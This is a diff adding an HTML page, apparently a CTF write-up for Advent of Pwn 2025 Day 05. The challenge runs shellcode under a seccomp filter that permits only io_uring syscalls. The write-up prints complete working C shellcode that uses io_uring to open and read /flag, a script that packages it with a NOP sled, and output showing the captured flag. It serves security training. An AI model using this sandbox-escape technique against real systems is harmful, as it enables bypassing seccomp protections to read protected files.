@@ -1,0 +1,415 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-01-advent-of-pwn-2025/day-05.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Day 05 - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#day-05" class="nav-link">Day 05</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="day-05">Day 05</h1>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-c">#include &lt;errno.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;linux/seccomp.h&gt;
+
+#define NORTH_POLE_ADDR (void *)0x1225000
+
+int setup_sandbox()
+{
+    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
+        perror("prctl(NO_NEW_PRIVS)");
+        return 1;
+    }
+
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+    if (!ctx) {
+        perror("seccomp_init");
+        return 1;
+    }
+
+    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) &lt; 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) &lt; 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) &lt; 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) &lt; 0) {
+        perror("seccomp_rule_add");
+        return 1;
+    }
+
+    if (seccomp_load(ctx) &lt; 0) {
+        perror("seccomp_load");
+        return 1;
+    }
+
+    seccomp_release(ctx);
+
+    return 0;
+}
+
+int main()
+{
+    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    if (code != NORTH_POLE_ADDR) {
+        perror("mmap");
+        return 1;
+    }
+
+    srand(time(NULL));
+    int offset = (rand() % 100) + 1;
+
+    puts("🛷 Loading cargo: please stow your sled at the front.");
+
+    if (read(STDIN_FILENO, code, 0x1000) &lt; 0) {
+        perror("read");
+        return 1;
+    }
+
+    puts("📜 Checking Santa's naughty list... twice!");
+    if (setup_sandbox() != 0) {
+        perror("setup_sandbox");
+        return 1;
+    }
+
+    // puts("❄️ Dashing through the snow!");
+    ((void (*)())(code + offset))();
+
+    // puts("🎅 Merry Christmas to all, and to all a good night!");
+    return 0;
+}</code></pre>
+<p>We can execute arbitrary shellcode, but limited to use <code>io_uring</code> syscalls. Therefore, we need to use io_uring to do <code>openat + readv + writev</code> syscalls. Because we cannot use <code>mmap</code>, we must use <code>IORING_SETUP_NO_MMAP</code> to provide buffers to the kernel. To simplify the logic further, we use <code>IORING_SETUP_NOSQARRAY</code> to remove extra layer of indirection. Then, for each syscall:</p>
+<ol>
+<li>allocate buffer on stack, initialize sqe array and sq/cq ring structure</li>
+<li>add the syscall information as sqe</li>
+<li>use <code>io_uring_setup</code> to create an io_uring fd</li>
+<li>use <code>io_uring_enter</code> to do the actual job</li>
+<li>poll cq.tail to wait for completion</li>
+</ol>
+<p>Attack code:</p>
+<pre class="highlight"><code class="language-c">#include &lt;fcntl.h&gt;
+#include &lt;linux/io_uring.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;unistd.h&gt;
+
+void test() {
+  // reuse address on stack
+  unsigned long long rsp_value;
+  asm volatile("mov %%rsp, %0" : "=r"(rsp_value));
+  rsp_value -= rsp_value % 4096;
+
+  // buffer for storing flag
+  struct iovec iovecs[1];
+  char buffer[256];
+  iovecs[0].iov_base = buffer;
+  iovecs[0].iov_len = sizeof(buffer);
+
+  for (int n = 0; n &lt; 3; n++) {
+    // follow
+    // https://github.com/shuveb/io_uring-by-example/blob/master/02_cat_uring/main.c
+    struct io_uring_params p;
+    for (int i = 0; i &lt; sizeof(p); i++) {
+      *(((char *)&amp;p) + i) = 0;
+    }
+    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;
+
+    // this is the sqe array
+    rsp_value -= 4096;
+    struct io_uring_sqe *sqe = (struct io_uring_sqe *)rsp_value;
+    for (int i = 0; i &lt; sizeof(struct io_uring_sqe); i++) {
+      *(((char *)sqe) + i) = 0;
+    }
+
+    // three syscalls:
+    // 1. openat(AT_FWCWD, "/flag", O_RDONLY)
+    // 2. readv() from opened flag
+    // 3. writev() to stdout
+    if (n == 0) {
+      // openat(AT_FWCWD, "/flag", O_RDONLY) = 4
+      sqe[0].opcode = IORING_OP_OPENAT;
+      char flag[] = "/flag";
+      sqe[0].addr = (__u64)flag;
+      sqe[0].fd = AT_FDCWD;
+      sqe[0].open_flags = O_RDONLY;
+    } else if (n == 1) {
+      // readv(4, iovec)
+      sqe[0].fd = 4;
+      sqe[0].opcode = IORING_OP_READV;
+      sqe[0].addr = (__u64)&amp;iovecs[0];
+      sqe[0].len = 1;
+    } else if (n == 2) {
+      // writev(1, iovec)
+      sqe[0].fd = 1;
+      sqe[0].opcode = IORING_OP_WRITEV;
+      sqe[0].addr = (__u64)&amp;iovecs[0];
+      sqe[0].len = 1;
+    }
+
+    p.sq_off.user_addr = rsp_value;
+
+    // this is the sq/cq ring
+    rsp_value -= 4096;
+    volatile unsigned *ring = (volatile unsigned *)rsp_value;
+    p.cq_off.user_addr = rsp_value;
+
+    // setup io_uring
+    int ring_fd = 0;
+    if (1) {
+      register int rax __asm__("rax") = SYS_io_uring_setup;
+      // arguments
+      register int rdi __asm__("rdi") = 10;
+      register const void *rsi __asm__("rsi") = &amp;p;
+      __asm__ volatile("syscall\n"     // Execute system call
+                       : "=a"(ring_fd) // Output: result in rax
+                       :
+                       : "rcx", "r11",
+                         "memory" // Clobbered registers
+      );
+    }
+
+    // submit
+    // update sq tail
+    ring[1] = 1;
+    register int rax __asm__("rax") = SYS_io_uring_enter;
+    // arguments
+    register int rdi __asm__("rdi") = ring_fd;
+    register int rsi __asm__("rsi") = 1; // to_submit
+    register int rdx __asm__("rdx") = 1; // min_complete
+    register int r10 __asm__("r10") = IORING_ENTER_GETEVENTS;
+    register int r8 __asm__("r8") = 0;
+    register int r9 __asm__("r9") = 0;
+    int ret;
+    __asm__ volatile("syscall\n" // Execute system call
+                     : "=a"(ret) // Output: result in rax
+                     :
+                     : "rcx", "r11",
+                       "memory" // Clobbered registers
+    );
+
+    // wait in cq
+    while (1) {
+      unsigned tail = ring[3];
+      if (tail == 1) {
+        break;
+      }
+    }
+  }
+}</code></pre>
+<p>Compile to bytecode:</p>
+<pre class="highlight"><code class="language-python">import os
+os.system("gcc test.c -o test.o -ffreestanding -nostdlib &amp;&amp; objcopy -O binary -j .text test.o test.bin &amp;&amp; objdump -m i386 -M amd64 -D -b binary test.bin")
+
+bytecode = open("test.bin", "rb").read()
+bytecode = b"\x90" * 100 + bytecode # handle the random offset
+open("bytecode.bin", "wb").write(bytecode)</code></pre>
+<p>Profit:</p>
+<pre class="highlight"><code class="language-shell">$ /challenge/sleigh &lt; bytecode.bin
+🛷 Loading cargo: please stow your sled at the front.
+📜 Checking Santa's naughty list... twice!
+pwn.college{AsRiadTljnFPtoRvjiXDqors0K6.0FOwkTMywyM5EzN0EzW}</code></pre>
+<p>Some debugging tips:</p>
+<ol>
+<li><code>strace</code> to see <code>io_uring</code> invocations</li>
+<li><code>sudo perf record -e "io_uring:*" -- ./sleigh</code> and <code>sudo perf script -i perf.data</code> to see the result of each io_uring submitted syscall</li>
+</ol></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
